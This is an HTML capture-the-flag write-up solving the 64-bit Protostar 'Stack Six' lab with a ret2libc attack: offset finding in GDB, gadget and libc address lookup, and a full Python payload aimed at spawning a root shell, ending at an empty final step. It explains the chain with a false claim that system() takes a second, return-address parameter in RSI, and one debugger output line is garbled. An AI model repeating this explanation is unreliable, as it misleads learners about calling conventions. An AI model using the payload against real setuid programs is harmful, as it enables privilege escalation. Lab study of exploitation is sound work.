<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>pwncone.io</title>
    <link rel="stylesheet" href="../../../../css/style.css">
  </head>

<body>

<section>

    <writeup>
		<h1><strong>#Protostar x64 - Stack Six</strong></h1>
	<a href="https://exploit.education/protostar/stack-six/">https://exploit.education/protostar/stack-six/</a><br>
	NOTE 1: Protostar doesn't offer 64-bit versions of the challenges itself. I set it up myself. For setup, refer <a href="../vm-setup/vm-setup.html">here</a><br>
	NOTE 2: I'm writing the 64-bit write-ups as follow-ups to the 32-bit challenges, so I won't be going over the intricacies of the exploit, just the differences involved with it now being a 64-bit challenge instead of 32-bit<br>
	<br>
	<img alt="images\9-1.png" src="images/9-1.png"><br>
	<br>
	On Stack Six the return address is restricted, so we can't return to shellcode on the stack. Instead, we have to ret2libc.<br>
	<br>
	<a id="h2-1" name="h2-1"></a><strong></strong>
	<h2><strong>x) Set Up</strong></h2><br>
	For a ret2libc attack, we need a few extra assembly instructions which aren't present in the original binary. For the sake of learning, I modified the source code and recompiled the binary to include what we need.<br>
	<br>
	First, modify the source (to include some inline assembly instructions).<br>
		<div class="codebox">
			root@ubuntu<span style="color:#ff9d00;font-weight:700">:/</span>home<span style="color:#ff9d00;font-weight:700">/</span>user<span style="color:#ff9d00;font-weight:700">/</span>protostar64<span style="color:#ff9d00;font-weight:700">/</span>bin#&nbsp;nano&nbsp;stack6-v2.c
		</div>
	</div><br>
	<br>
		<div class="codebox">
			<span style="color:#7f0044;font-weight:700">#include&nbsp;&lt;stdlib.h&gt;</span><br>
			<span style="color:#7f0044;font-weight:700">#include&nbsp;&lt;unistd.h&gt;</span><br>
			<span style="color:#7f0044;font-weight:700">#include&nbsp;&lt;stdio.h&gt;</span><br>
			<span style="color:#7f0044;font-weight:700">#include&nbsp;&lt;string.h&gt;</span><br>
			<br>
			<span style="color:#7f0044;font-weight:400">void</span>&nbsp;instructions()<br>
			{<br>
			&nbsp;&nbsp;__asm__(<span style="color:#3ad900;font-weight:400">"pop&nbsp;%rdi;&nbsp;ret\n\t"</span><br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"pop&nbsp;%rsi;&nbsp;ret\n\t"</span>);<br>
			}<br>
			<br>
			<span style="color:#7f0044;font-weight:400">void</span>&nbsp;getpath()<br>
			{<br>
			&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;buffer[<span style="color:#ff0044;font-weight:400">64</span>];<br>
			&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">unsigned</span>&nbsp;<span style="color:#7f0044;font-weight:400">int</span>&nbsp;ret;<br>
			<br>
			&nbsp;&nbsp;printf(<span style="color:#3ad900;font-weight:400">"input&nbsp;path&nbsp;please:&nbsp;"</span>);&nbsp;fflush(stdout);<br>
			<br>
			&nbsp;&nbsp;gets(buffer);<br>
			<br>
			&nbsp;&nbsp;ret&nbsp;=&nbsp;__builtin_return_address(<span style="color:#ff0044;font-weight:400">0</span>);<br>
			<br>
			&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>((ret&nbsp;&amp;&nbsp;<span style="color:#ff0044;font-weight:400">0xbf000000</span>)&nbsp;==&nbsp;<span style="color:#ff0044;font-weight:400">0xbf000000</span>)&nbsp;{<br>
			&nbsp;&nbsp;&nbsp;&nbsp;printf(<span style="color:#3ad900;font-weight:400">"bzzzt&nbsp;(%p)\n"</span>,&nbsp;ret);<br>
			&nbsp;&nbsp;&nbsp;&nbsp;_exit(<span style="color:#ff0044;font-weight:400">1</span>);<br>
			&nbsp;&nbsp;}<br>
			<br>
			&nbsp;&nbsp;printf(<span style="color:#3ad900;font-weight:400">"got&nbsp;path&nbsp;%s\n"</span>,&nbsp;buffer);<br>
			}<br>
			<br>
			<span style="color:#7f0044;font-weight:400">int</span>&nbsp;main(<span style="color:#7f0044;font-weight:400">int</span>&nbsp;argc,&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;**argv)<br>
			{<br>
			&nbsp;&nbsp;getpath();<br>
			}
		</div>
	</div><br>
	<br>
	Then recompile the binary.<br>
	The compilation errors are fine.<br>
		<div class="codebox">
			root@ubuntu<span style="color:#ff9d00;font-weight:700">:/</span>home<span style="color:#ff9d00;font-weight:700">/</span>user<span style="color:#ff9d00;font-weight:700">/</span>protostar64<span style="color:#ff9d00;font-weight:700">/</span>bin#&nbsp;<span style="color:#ff9d00;font-weight:700">gcc</span>&nbsp;stack6-v2.c&nbsp;-o&nbsp;stack6-v2&nbsp;-fno-stack-protector&nbsp;-D_FORTIFY_SOURCE=0<br>
			[...]<br>
			root@ubuntu<span style="color:#ff9d00;font-weight:700">:/</span>home<span style="color:#ff9d00;font-weight:700">/</span>user<span style="color:#ff9d00;font-weight:700">/</span>protostar64<span style="color:#ff9d00;font-weight:700">/</span>bin#&nbsp;<span style="color:#ff9d00;font-weight:700">chmod</span>&nbsp;+s&nbsp;stack6-v2
		</div>
	</div><br>
	<br>
	<a id="h2-2" name="h2-2"></a><strong></strong>
	<h2><strong>1) Offset to RIP</strong></h2><br>
	Before you start with ret2libc, find the offset to overflow the buffer and overwrite RIP.<br>
	<br>
	Create a cyclic pattern with <code>msf-pattern_create</code>, open the binary in GDB and submit the pattern.<br>
	Examine the value in RSP to find the cyclic pattern that will overwrite RIP.<br>
		<div class="codebox">
			user@ubuntu<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>protostar64$&nbsp;gdb&nbsp;-q&nbsp;bin<span style="color:#ff9d00;font-weight:700">/</span>stack6<br>
			Reading&nbsp;symbols&nbsp;from&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>user<span style="color:#ff9d00;font-weight:700">/</span>protostar64<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>stack6...<span style="color:#ff9d00;font-weight:700">(</span>no&nbsp;debugging&nbsp;symbols&nbsp;found<span style="color:#ff9d00;font-weight:700">)</span>...done.<br>
			<span style="color:#ff9d00;font-weight:700">(</span>gdb<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;run<br>
			Starting&nbsp;program<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>user<span style="color:#ff9d00;font-weight:700">/</span>protostar64<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>stack6&nbsp;<br>
			input&nbsp;path&nbsp;please<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A<br>
			got&nbsp;path&nbsp;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac9Ad6Ac7Ac8Ac9Ad0Ad1Ad2A<br>
			<br>
			Program&nbsp;received&nbsp;signal&nbsp;SIGSEGV,&nbsp;Segmentation&nbsp;fault.<br>
			0x000000000040069a&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;<span style="color:#ffdd00;font-weight:400">getpath&nbsp;()</span><br>
			<span style="color:#ff9d00;font-weight:700">(</span>gdb<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;x<span style="color:#ff9d00;font-weight:700">/</span>xg&nbsp;<span style="color:#7f0044;font-weight:400">$rsp</span><br>
			0x7fffffffe568<span style="color:#ff9d00;font-weight:700">:</span> 0x3164413064413963
		</div>
	</div><br>
	<br>
		<div class="codebox">
			┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>exploit-education<span style="color:#ff9d00;font-weight:700">/</span>protostar-x64]<br>
			└──╼&nbsp;<span style="color:#0088ff;font-weight:400">#msf-pattern_offset&nbsp;-q&nbsp;0x3164413064413963</span><br>
			[*]&nbsp;Exact&nbsp;match&nbsp;at&nbsp;offset&nbsp;88
		</div>
	</div><br>
	<br>
	<br>
	<a id="h2-3" name="h2-3"></a><strong></strong>
	<h2><strong>Info - ret2libc 32-bit vs 64-bit</strong></h2><br>
	On 32-bit machines, parameters for functions are read from the stack.<br>
	However, on 64-bit machines, parameters for functions are read from registers.<br>
	<br>
	Parameters are read from the registers in this order - <code>RDI, RSI, RDX, RCX, R8, R9</code>.<br>
	If there are more than 6 parameters for a function, the extra parameters are placed onto the stack.<br>
	<br>
	<a id="h3-1" name="h3-1"></a><strong></strong>
	<h3><strong>How to set up the registers? - Gadgets</strong></h3><br>
	The goal of Stack Six is spawn a root shell.<br>
	In that case, we want to use the <code>system()</code> function.<br>
	<code>system()</code> takes 2 parameters:<br>
	1. A pointer to a string containng the command you want to run - e.g. <code>/bin/sh</code><br>
	2. An address/function to return to after system() exits - e.g. <code>exit()</code> (to exit the binary)<br>
	<br>
	Our 1st parameter - <code>/bin/sh</code> - needs to be in RDI.<br>
	Our 2nd paramter - address of <code>exit()</code> - needs to be in RSI.<br>
	<br>
	<code>pop</code> and <code>ret</code> are assembly instructions.<br>
	<code>pop</code> loads the value from the top of the stack into a specified register.<br>
	<code>ret</code> transfers program control to a return address located on the top of the stack.<br>
	<br>
	To place values into our chosen registers, we need to combine these 2 instructions.<br>
	In exploit development, an assembly instruction followed by a <code>ret</code>, like <code>pop r9; pop r10; ret</code>, is called a <em>gadget</em>.<br>
	<br>
	To set up our 1st parameter - <code>/bin/sh</code> - we need to write <code>/bin/sh</code> to the stack and then execute a <code>pop rdi; ret</code> instruction.<br>
	To set up our 2nd parameter - address of <code>exit()</code> - we need to write the address exit() to the stack and then execute a <code>pop rsi; ret</code> instruction.<br>
	<br>
	We need the <code>pop</code> instruction to pop the value into our register, and we need the <code>ret</code> instruction so that we can control code execution after the pop instruction has finished, otherwise the binary would just crash.<br>
	<br>
	<a id="h3-2" name="h3-2"></a><strong></strong>
	<h3><strong>Summary / Exploit Overview</strong></h3><br>
	<br>
	<strong>Parameters</strong><br>
	Parameters for 64-bit function calls need to be in registers.<br>
	To set up registers:<br>
	1st, write the parameter to the stack.<br>
	2nd, use a <code>pop ?; ret</code> gadget to pop that value into your specified register.<br>
	<br>
	<strong>Exploit Flow</strong><br>
	Here's how our exploit will look:<br>
	1. Overflow buffer<br>
	2. Overwrite <code>RIP</code> with address of <code>pop rdi; ret</code> instruction (to set up 1st parameter)<br>
	3. Write <code>/bin/sh</code> string to the stack (so that <code>pop rdi; ret</code> will pop it into RDI)<br>
	4. Write <code>pop rsi; ret</code> address to the stack (so that <code>ret</code> from <code>pop rdi; ret</code> will return to it)<br>
	5. Write <code>exit()</code> adddress to the stack (so that <code>pop rsi; ret</code> will pop it into RSI)<br>
	6. Write system() address to the stack (so that <code>ret</code> from <code>pop rsi; ret</code> will return to it)<br>
	<br>
	<a id="h2-4" name="h2-4"></a><strong></strong>
	<h2><strong>2) Find ret2libc Gadgets</strong></h2><br>
	Use objdump to disassemble the binary.<br>
	<br>
	Because we modified and recompiled the binary to include a few extra assembly instructions, we have what we need to perform a ret2libc attack (these aren't here normally).<br>
	<br>
	A <code>pop rdi; ret</code> instruction is available at <code>0x400618</code>,<br>
	and a <code>pop rsi; ret</code> instruction is available at <code>0x40061a</code>.<br>
		<div class="codebox">
			user@ubuntu<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>protostar64<span style="color:#ff9d00;font-weight:700">/</span>bin$&nbsp;objdump&nbsp;-M&nbsp;intel&nbsp;-d&nbsp;stack6-v2<br>
			0000000000400614&nbsp;&lt;instructions&gt;<span style="color:#ff9d00;font-weight:700">:</span><br>
			&nbsp;&nbsp;400614<span style="color:#ff9d00;font-weight:700">:</span> 55&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp;&nbsp;rbp<br>
			&nbsp;&nbsp;400615<span style="color:#ff9d00;font-weight:700">:</span> 48&nbsp;89&nbsp;e5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;rbp,rsp<br>
			&nbsp;&nbsp;400618<span style="color:#ff9d00;font-weight:700">:</span> 5f&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop&nbsp;&nbsp;&nbsp;&nbsp;rdi<br>
			&nbsp;&nbsp;400619<span style="color:#ff9d00;font-weight:700">:</span> c3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ret&nbsp;&nbsp;&nbsp;&nbsp;<br>
			&nbsp;&nbsp;40061a<span style="color:#ff9d00;font-weight:700">:</span> 5e&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop&nbsp;&nbsp;&nbsp;&nbsp;rsi<br>
			&nbsp;&nbsp;40061b<span style="color:#ff9d00;font-weight:700">:</span> c3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ret&nbsp;&nbsp;&nbsp;&nbsp;<br>
			&nbsp;&nbsp;40061c<span style="color:#ff9d00;font-weight:700">:</span> 5d&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop&nbsp;&nbsp;&nbsp;&nbsp;rbp<br>
			&nbsp;&nbsp;40061d<span style="color:#ff9d00;font-weight:700">:</span> c3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ret
		</div>
	</div><br>
	<br>
	<a id="h2-5" name="h2-5"></a><strong></strong>
	<h2><strong>3) Find ret2libc Values</strong></h2><br>
	For a ret2libc attack, we need:<br>
	• address of system()<br>
	• address of exit()<br>
	• address of "/bin/sh" string<br>
	◇ get this by finding libc base address and offset to /bin/sh in libc<br>
	◇ then add the 2 values together<br>
	<br>
	<a id="h3-3" name="h3-3"></a><strong></strong>
	<h3><strong>3a) Address of system() and exit()</strong></h3><br>
	Open the binary in GDB, set a breakpoint on main, run the binary, and use <code>print</code> to view the addresses of <code>system()</code> and <code>exit()</code><br>
		<div class="codebox">
			user@ubuntu<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>protostar64$&nbsp;gdb&nbsp;-q&nbsp;bin<span style="color:#ff9d00;font-weight:700">/</span>stack6<br>
			Reading&nbsp;symbols&nbsp;from&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>user<span style="color:#ff9d00;font-weight:700">/</span>protostar64<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>stack6...<span style="color:#ff9d00;font-weight:700">(</span>no&nbsp;debugging&nbsp;symbols&nbsp;found<span style="color:#ff9d00;font-weight:700">)</span>...done.<br>
			<span style="color:#ff9d00;font-weight:700">(</span>gdb<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">break</span>&nbsp;main<br>
			Breakpoint&nbsp;1&nbsp;at&nbsp;0x40069f<br>
			<span style="color:#ff9d00;font-weight:700">(</span>gdb<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;run<br>
			Starting&nbsp;program<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>user<span style="color:#ff9d00;font-weight:700">/</span>protostar64<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>stack6&nbsp;<br>
			warning<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;no&nbsp;loadable&nbsp;sections&nbsp;found&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;added&nbsp;symbol-file&nbsp;system-supplied&nbsp;DSO&nbsp;at&nbsp;0x7ffff7ffa000<br>
			<br>
			Breakpoint&nbsp;1,&nbsp;0x000000000040069f&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;<span style="color:#ffdd00;font-weight:400">main&nbsp;()</span><br>
			<span style="color:#ff9d00;font-weight:700">(</span>gdb<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;print&nbsp;system<br>
			<span style="color:#7f0044;font-weight:400">$1</span>&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">{</span>&lt;text&nbsp;variable,&nbsp;no&nbsp;debug&nbsp;<span style="color:#ff9d00;font-weight:700">info</span>&gt;<span style="color:#ff9d00;font-weight:700">}</span>&nbsp;0x7ffff7a5f730&nbsp;&lt;system&gt;<br>
			<span style="color:#ff9d00;font-weight:700">(</span>gdb<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;print&nbsp;<span style="color:#ff9d00;font-weight:700">exit</span><br>
			<span style="color:#7f0044;font-weight:400">$2</span>&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">{</span>&lt;text&nbsp;variable,&nbsp;no&nbsp;debug&nbsp;<span style="color:#ff9d00;font-weight:700">info</span>&gt;<span style="color:#ff9d00;font-weight:700">}</span>&nbsp;0x7ffff7a55a40&nbsp;&lt;exit&gt;
		</div>
	</div><br>
	<br>
	<a id="h3-4" name="h3-4"></a><strong></strong>
	<h3><strong>3b) Address of "/bin/sh" string</strong></h3><br>
	Open the binary in GDB, set a breakpoint on main, run the binary, and run <code>info proc mappings</code> and read the first instance of libc at offset 0 to find the base address of libc in the binary.<br>
	<br>
	Libc base address = <code>0x7ffff7a1a000</code><br>
		<div class="codebox">
			<span style="color:#ff9d00;font-weight:700">(</span>gdb<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">info</span>&nbsp;proc&nbsp;mappings<br>
			process&nbsp;7604<br>
			Mapped&nbsp;address&nbsp;spaces<span style="color:#ff9d00;font-weight:700">:</span><br>
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Start&nbsp;Addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;End&nbsp;Addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Size&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Offset&nbsp;objfile<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x400000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x401000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x1000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>user<span style="color:#ff9d00;font-weight:700">/</span>protostar64<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>stack6<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x600000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x601000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x1000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>user<span style="color:#ff9d00;font-weight:700">/</span>protostar64<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>stack6<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x601000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x602000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x1000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x1000&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>user<span style="color:#ff9d00;font-weight:700">/</span>protostar64<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>stack6<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x7ffff7a1a000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x7ffff7bcf000&nbsp;&nbsp;&nbsp;0x1b5000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>lib<span style="color:#ff9d00;font-weight:700">/</span>x86_64-linux-gnu<span style="color:#ff9d00;font-weight:700">/</span>libc-2.15.so<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x7ffff7bcf000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x7ffff7dcf000&nbsp;&nbsp;&nbsp;0x200000&nbsp;&nbsp;&nbsp;0x1b5000&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>lib<span style="color:#ff9d00;font-weight:700">/</span>x86_64-linux-gnu<span style="color:#ff9d00;font-weight:700">/</span>libc-2.15.so<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x7ffff7dcf000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x7ffff7dd3000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x4000&nbsp;&nbsp;&nbsp;0x1b5000&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>lib<span style="color:#ff9d00;font-weight:700">/</span>x86_64-linux-gnu<span style="color:#ff9d00;font-weight:700">/</span>libc-2.15.so<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x7ffff7dd3000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x7ffff7dd5000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x2000&nbsp;&nbsp;&nbsp;0x1b9000&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>lib<span style="color:#ff9d00;font-weight:700">/</span>x86_64-linux-gnu<span style="color:#ff9d00;font-weight:700">/</span>libc-2.15.so
		</div>
	</div><br>
	<br>
	Run strings against libc to find its offset within libc.<br>
	<code>/bin/sh</code> offset = <code>0x17a471</code><br>
		<div class="codebox">
			user@ubuntu<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>protostar64$&nbsp;strings&nbsp;-a&nbsp;-t&nbsp;x&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>lib<span style="color:#ff9d00;font-weight:700">/</span>x86_64-linux-gnu<span style="color:#ff9d00;font-weight:700">/</span>libc-2.15.so&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">grep</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/sh</span><br>
			&nbsp;17a471&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/sh</span>
		</div>
	</div><br>
	<br>
	To find the total address of <code>/bin/sh</code> in libc we just need to add these 2 values together, which we'll do within the exploit script.<br>
	<br>
	<a id="h2-6" name="h2-6"></a><strong></strong>
	<h2><strong>4) Write Exploit</strong></h2><br>
	With a set of gadgets, our ret2libc values and the offset to overwrite RIP, we have everything we need to write the exploit.<br>
	<br>
		<div class="codebox">
			<span style="color:#0088ff;font-weight:400">#!/usr/bin/python</span><br>
			<span style="color:#0088ff;font-weight:400">#&nbsp;exploit.education&nbsp;-&nbsp;Protostar&nbsp;x64&nbsp;-&nbsp;Stack&nbsp;Six&nbsp;v2</span><br>
			<br>
			<span style="color:#333333;font-weight:400">import</span>&nbsp;struct<br>
			<br>
			<span style="color:#ff9d00;font-weight:700">buffer</span>&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">88</span><br>
			<br>
			<span style="color:#0088ff;font-weight:400">#&nbsp;LIBC</span><br>
			libc_base&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0x7ffff7a1a000</span><br>
			<span style="color:#0088ff;font-weight:400">#&nbsp;offsets</span><br>
			libc_binsh_offset&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0x17a471</span><br>
			<span style="color:#0088ff;font-weight:400">#&nbsp;addresses</span><br>
			libc_system_addr&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;Q'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x7ffff7a5f730</span>)<br>
			libc_exit_addr&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;Q'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x7ffff7a55a40</span>)<br>
			libc_binsh_addr&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;Q'</span>,&nbsp;libc_base&nbsp;+&nbsp;libc_binsh_offset)<br>
			<br>
			<span style="color:#0088ff;font-weight:400">#&nbsp;INSTRUCTIONS</span><br>
			pop_rdi_ret&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;Q'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x400618</span>)<br>
			pop_rsi_ret&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;Q'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x40061a</span>)<br>
			<br>
			payload&nbsp;&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"A"</span>&nbsp;*&nbsp;<span style="color:#ff9d00;font-weight:700">buffer</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;overflow&nbsp;buffer</span><br>
			payload&nbsp;+=&nbsp;pop_rdi_ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;overwrite&nbsp;RIP</span><br>
			payload&nbsp;+=&nbsp;libc_binsh_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;"/bin/sh"&nbsp;into&nbsp;RDI</span><br>
			payload&nbsp;+=&nbsp;pop_rsi_ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;return&nbsp;to&nbsp;a&nbsp;"pop&nbsp;rsi;&nbsp;ret"&nbsp;instruction</span><br>
			payload&nbsp;+=&nbsp;libc_exit_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;exit()&nbsp;address&nbsp;into&nbsp;RSI&nbsp;-&nbsp;system()&nbsp;NOW&nbsp;SET&nbsp;UP!</span><br>
			payload&nbsp;+=&nbsp;libc_system_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;return&nbsp;to&nbsp;system()</span><br>
			<br>
			<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;payload
		</div>
	</div><br>
	<br>
	<a id="h2-7" name="h2-7"></a><strong></strong>
	<h2><strong>5) Win</strong></h2><br>
	Spawn a root shell!<br>
		<div class="codebox">
